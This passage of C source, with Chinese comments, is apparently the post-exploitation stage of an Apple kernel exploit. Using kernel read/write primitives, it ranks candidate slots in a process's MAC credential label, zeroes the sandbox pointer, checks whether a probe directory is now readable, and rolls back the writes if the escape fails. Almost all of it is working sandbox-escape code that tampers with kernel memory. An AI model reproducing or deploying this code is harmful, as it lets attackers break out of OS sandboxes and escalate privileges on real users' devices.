    int sn = sxs_scan_label_slots(label);

    // ---- 2) 候选排序：分高的先试；+0x10 同分优先 ----
    int order[SXS_LABEL_SLOTS];
    for (int i = 0; i < sn; i++) order[i] = i;
    for (int i = 0; i < sn; i++) {
        for (int j = i + 1; j < sn; j++) {
            int a = order[i], b = order[j];
            bool want = (g_slotinfo[b].score > g_slotinfo[a].score);
            if (!want && g_slotinfo[b].score == g_slotinfo[a].score &&
                g_slotinfo[b].off == SXS_OFF_LABEL_SANDBOX) want = true;
            if (want) { order[i] = b; order[j] = a; }
        }
    }

    // ---- 3) 十六个槽一个都解不出来 → 退回校准偏移（门诊验过这条链，等同 v9.8 那一刀）----
    bool fromScan = (sn > 0);
    if (sn == 0) {
        uint64_t p = sxs_ptr(ds_kread64(label + SXS_OFF_LABEL_SANDBOX));
        if (sxs_k(p)) {
            memset(&g_slotinfo[0], 0, sizeof(g_slotinfo[0]));
            g_slotinfo[0].off   = SXS_OFF_LABEL_SANDBOX;
            g_slotinfo[0].ptr   = p;
            g_slotinfo[0].score = 1;
            sn = 1;
            order[0] = 0;
        }
    }

    if (sn == 0) {
        snprintf(g_cred_note, sizeof(g_cred_note),
                 "label=0x%llx 十六个槽里都没有沙盒结构 —— 这个进程本来就没挂沙盒，不用改",
                 (unsigned long long)label);
        g_cred_level = 0;
        return 0;
    }

    // ---- 4) 顺手扫一遍：同一个沙盒还被 proc / proc_ro 里谁指着（只读）----
    uint64_t procro = sxs_ptr(ds_kread64(proc + SXS_OFF_PROC_RO));
    sxs_scan_sandbox_refs(proc, procro, g_slotinfo[order[0]].ptr);

    // ---- 5) 逐个候选下手：最多试 3 个，每试一个都问内核一次 ----
    int tried = 0;
    char triedLog[256] = {0};
    size_t tl = 0;

    for (int k = 0; k < sn && tried < 3; k++) {
        sxs_slotinfo_t *c = &g_slotinfo[order[k]];
        if (c->score <= 0) continue;
        if (tried > 0 && c->score < 10) continue;   // 第二个起必须有硬证据，不硬猜

        uint64_t slot = label + c->off;
        if (!sxs_ok_to_write(slot, 8)) {
            snprintf(g_cred_note, sizeof(g_cred_note),
                     "沙盒指针在 0x%llx，判定没放行：%s —— 这一刀没下，内核一个字节都没动",
                     (unsigned long long)slot, g_gate);
            if (tried > 0) sxs_rollback();
            return -5;
        }

        cg_mark("摘沙盒/写凭证");
        sxs_save(slot, 8);
        uint64_t zero = 0;
        ds_kwrite(slot, &zero, 8);
        tried++;

        uint64_t back = ds_kread64(slot);
        if (back != 0) {
            snprintf(g_cred_note, sizeof(g_cred_note),
                     "写了但读回不是 0（0x%llx）—— 这个位置没写进去，回滚",
                     (unsigned long long)back);
            sxs_rollback();
            return -6;
        }

        g_sb_after = sxs_sandbox_check(SXS_PROBE_PATH);          // 内核侧到底认不认
        bool opened = (sxs_open_count(SXS_PROBE_PATH) >= 0);      // 真去开一次目录

        if (tl < sizeof(triedLog) - 64) {
            tl += (size_t)snprintf(triedLog + tl, sizeof(triedLog) - tl,
                                   "+0x%x(分%d)=%s ", (unsigned)c->off, c->score,
                                   sxs_sb_text(g_sb_after));
        }

        if (g_sb_after == 0 || opened) {
            g_cred_level = 1;
            snprintf(g_cred_note, sizeof(g_cred_note),
                     "沙盒指针已摘：槽 +0x%x（分 %d%s）· 原值 0x%llx → 0 · 只写 8 字节 · "
                     "自检 改前=%s → 改后=%s · 目录可列=%s",
                     (unsigned)c->off, c->score, fromScan ? "" : "·回退偏移",
                     (unsigned long long)c->ptr,
                     sxs_sb_text(g_sb_before), sxs_sb_text(g_sb_after),
                     opened ? "是" : "否");
            sxs_say("%s", g_cred_note);

            if (tried > 1) {
                int backN = sxs_restore_except_last();
                sxs_say("前面 %d 个候选没开门，已原样写回（只保留真正开门那一刀）", backN);
            }
            return 1;
        }
    }

    // ---- 6) 一个都不灵 → 整批回滚，内核恢复原样 ----
    int n = sxs_rollback();
    g_cred_level = 0;
    snprintf(g_cred_note, sizeof(g_cred_note),
             "试了 %d 个候选槽（%s）都没让目录开门，已回滚 %d 处 · 沙盒自检 改前=%s 改后=%s",
             tried, triedLog[0] ? triedLog : "-", n,
             sxs_sb_text(g_sb_before), sxs_sb_text(g_sb_after));
    sxs_say("%s", g_cred_note);
    return -7;
}

// MARK: - 验证

int sxs_open_count(const char *path) {
    g_errno_v = 0;
    if (!path) return -EINVAL;
    DIR *d = opendir(path);
    if (!d) {
        g_errno_v = errno;
        return -errno;
    }
    int n = 0;
    struct dirent *e = NULL;
    while ((e = readdir(d)) != NULL) {
        if (strcmp(e->d_name, ".") == 0 || strcmp(e->d_name, "..") == 0) continue;
        n++;
        if (n > 20000) break;
    }
    closedir(d);
    return n;
}

int sxs_writable(const char *path) {
    g_errno_v = 0;
    if (!path) return 0;
    if (access(path, W_OK) != 0) {
        g_errno_v = errno;
        return 0;
    }
    return 1;
}

int sxs_errno(void) {
    return g_errno_v;
}

const char *sxs_verdict(void) {
    return g_verdict;
}
